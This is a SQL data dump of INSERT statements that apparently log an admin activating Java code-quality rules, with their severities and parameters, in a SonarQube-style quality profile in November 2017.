INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (895, '2017-11-20 07:41:36.798', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:MaximumInheritanceDepth;ruleKey=squid:MaximumInheritanceDepth;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;param_max=5;param_filteredClasses=;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBaebbGRdfPp-qri');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (896, '2017-11-20 07:41:36.842', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:MissingDeprecatedCheck;ruleKey=squid:MissingDeprecatedCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBbKbbGRdfPp-qrj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (897, '2017-11-20 07:41:36.884', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:ModifiersOrderCheck;ruleKey=squid:ModifiersOrderCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBb0bbGRdfPp-qrk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (898, '2017-11-20 07:41:36.916', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:ObjectFinalizeCheck;ruleKey=squid:ObjectFinalizeCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBcUbbGRdfPp-qrl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (899, '2017-11-20 07:41:36.946', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:ObjectFinalizeOverridenCallsSuperFinalizeCheck;ruleKey=squid:ObjectFinalizeOverridenCallsSuperFinalizeCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBcybbGRdfPp-qrm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (900, '2017-11-20 07:41:36.984', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:ObjectFinalizeOverridenCheck;ruleKey=squid:ObjectFinalizeOverridenCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBdYbbGRdfPp-qrn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (901, '2017-11-20 07:41:37.028', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:RedundantThrowsDeclarationCheck;ruleKey=squid:RedundantThrowsDeclarationCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBeEbbGRdfPp-qro');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (902, '2017-11-20 07:41:37.073', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S00100;ruleKey=squid:S00100;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBexbbGRdfPp-qrp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (903, '2017-11-20 07:41:37.113', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S00101;ruleKey=squid:S00101;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;param_format=^[A-Z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBfZbbGRdfPp-qrq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (904, '2017-11-20 07:41:37.155', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S00107;ruleKey=squid:S00107;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;param_max=7;param_constructorMax=7;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBgDbbGRdfPp-qrr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (905, '2017-11-20 07:41:37.179', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S00108;ruleKey=squid:S00108;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBgbbbGRdfPp-qrs');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (906, '2017-11-20 07:41:37.22', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S00112;ruleKey=squid:S00112;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBhEbbGRdfPp-qrt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (907, '2017-11-20 07:41:37.289', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S00114;ruleKey=squid:S00114;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;param_format=^[A-Z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBiJbbGRdfPp-qru');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (908, '2017-11-20 07:41:37.342', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S00115;ruleKey=squid:S00115;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;param_format=^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*$;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBi-bbGRdfPp-qrv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (909, '2017-11-20 07:41:37.392', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S00116;ruleKey=squid:S00116;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBjwbbGRdfPp-qrw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (910, '2017-11-20 07:41:37.421', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S00117;ruleKey=squid:S00117;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBkNbbGRdfPp-qrx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (911, '2017-11-20 07:41:37.459', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S00119;ruleKey=squid:S00119;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;param_format=^[A-Z][0-9]?$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBkzbbGRdfPp-qry');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (912, '2017-11-20 07:41:37.529', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S00120;ruleKey=squid:S00120;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;param_format=^[a-z]+(\.[a-z][a-z0-9]*)*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBl5bbGRdfPp-qrz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (913, '2017-11-20 07:41:37.558', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S106;ruleKey=squid:S106;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBmWbbGRdfPp-qr0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (914, '2017-11-20 07:41:37.596', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1065;ruleKey=squid:S1065;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBm8bbGRdfPp-qr1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (915, '2017-11-20 07:41:37.627', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1066;ruleKey=squid:S1066;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBnbbbGRdfPp-qr2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (916, '2017-11-20 07:41:37.663', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1068;ruleKey=squid:S1068;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBn_bbGRdfPp-qr3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (917, '2017-11-20 07:41:37.701', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1075;ruleKey=squid:S1075;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBolbbGRdfPp-qr4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (918, '2017-11-20 07:41:37.728', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1118;ruleKey=squid:S1118;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBpAbbGRdfPp-qr5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (919, '2017-11-20 07:41:37.779', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1125;ruleKey=squid:S1125;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBpzbbGRdfPp-qr6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (920, '2017-11-20 07:41:37.848', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1126;ruleKey=squid:S1126;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBq4bbGRdfPp-qr7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (921, '2017-11-20 07:41:37.889', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1133;ruleKey=squid:S1133;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=INFO', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBrhbbGRdfPp-qr8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (922, '2017-11-20 07:41:37.94', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1134;ruleKey=squid:S1134;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBsUbbGRdfPp-qr9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (923, '2017-11-20 07:41:38.005', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1135;ruleKey=squid:S1135;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=INFO', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBtVbbGRdfPp-qr-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (924, '2017-11-20 07:41:38.046', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1141;ruleKey=squid:S1141;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBt-bbGRdfPp-qr_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (925, '2017-11-20 07:41:38.096', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1143;ruleKey=squid:S1143;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBuwbbGRdfPp-qsA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (926, '2017-11-20 07:41:38.142', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1148;ruleKey=squid:S1148;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBvebbGRdfPp-qsB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (927, '2017-11-20 07:41:38.181', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1149;ruleKey=squid:S1149;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBwEbbGRdfPp-qsC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (928, '2017-11-20 07:41:38.251', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1150;ruleKey=squid:S1150;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBxLbbGRdfPp-qsD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (929, '2017-11-20 07:41:38.304', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1153;ruleKey=squid:S1153;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYByAbbGRdfPp-qsE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (930, '2017-11-20 07:41:38.348', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1155;ruleKey=squid:S1155;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBysbbGRdfPp-qsF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (931, '2017-11-20 07:41:38.39', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1157;ruleKey=squid:S1157;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYBzWbbGRdfPp-qsG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (932, '2017-11-20 07:41:38.433', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1158;ruleKey=squid:S1158;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYB0BbbGRdfPp-qsH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (933, '2017-11-20 07:41:38.473', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1161;ruleKey=squid:S1161;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYB0pbbGRdfPp-qsI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (934, '2017-11-20 07:41:38.516', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1163;ruleKey=squid:S1163;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYB1UbbGRdfPp-qsJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (935, '2017-11-20 07:41:38.556', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1165;ruleKey=squid:S1165;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYB18bbGRdfPp-qsK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (936, '2017-11-20 07:41:38.598', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1168;ruleKey=squid:S1168;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYB2mbbGRdfPp-qsL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (937, '2017-11-20 07:41:38.649', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1170;ruleKey=squid:S1170;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYB3ZbbGRdfPp-qsM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (938, '2017-11-20 07:41:38.686', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1171;ruleKey=squid:S1171;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYB3-bbGRdfPp-qsN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (939, '2017-11-20 07:41:38.713', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1172;ruleKey=squid:S1172;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYB4ZbbGRdfPp-qsO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (940, '2017-11-20 07:41:38.752', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1174;ruleKey=squid:S1174;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYB5AbbGRdfPp-qsP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (941, '2017-11-20 07:41:38.819', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1175;ruleKey=squid:S1175;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYB6DbbGRdfPp-qsQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (942, '2017-11-20 07:41:38.885', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1181;ruleKey=squid:S1181;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYB7FbbGRdfPp-qsR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (943, '2017-11-20 07:41:38.945', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1182;ruleKey=squid:S1182;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYB8BbbGRdfPp-qsS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (944, '2017-11-20 07:41:39.03', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1185;ruleKey=squid:S1185;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYB9WbbGRdfPp-qsT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (945, '2017-11-20 07:41:39.067', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1186;ruleKey=squid:S1186;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYB97bbGRdfPp-qsU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (946, '2017-11-20 07:41:39.105', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1190;ruleKey=squid:S1190;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYB-hbbGRdfPp-qsV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (947, '2017-11-20 07:41:39.139', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1191;ruleKey=squid:S1191;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;param_Exclude=;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYB_DbbGRdfPp-qsW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (948, '2017-11-20 07:41:39.178', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1192;ruleKey=squid:S1192;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;param_threshold=3;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYB_qbbGRdfPp-qsX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (949, '2017-11-20 07:41:39.219', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1193;ruleKey=squid:S1193;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCASbbGRdfPp-qsY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (950, '2017-11-20 07:41:39.259', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1195;ruleKey=squid:S1195;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCA7bbGRdfPp-qsZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (951, '2017-11-20 07:41:39.303', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1197;ruleKey=squid:S1197;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCBnbbGRdfPp-qsa');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (952, '2017-11-20 07:41:39.341', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1199;ruleKey=squid:S1199;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCCNbbGRdfPp-qsb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (953, '2017-11-20 07:41:39.382', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1201;ruleKey=squid:S1201;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCC2bbGRdfPp-qsc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (954, '2017-11-20 07:41:39.424', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1206;ruleKey=squid:S1206;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCDgbbGRdfPp-qsd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (955, '2017-11-20 07:41:39.464', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114:squid:S1210;ruleKey=squid:S1210;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_13-51114;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YYCEIbbGRdfPp-qse');
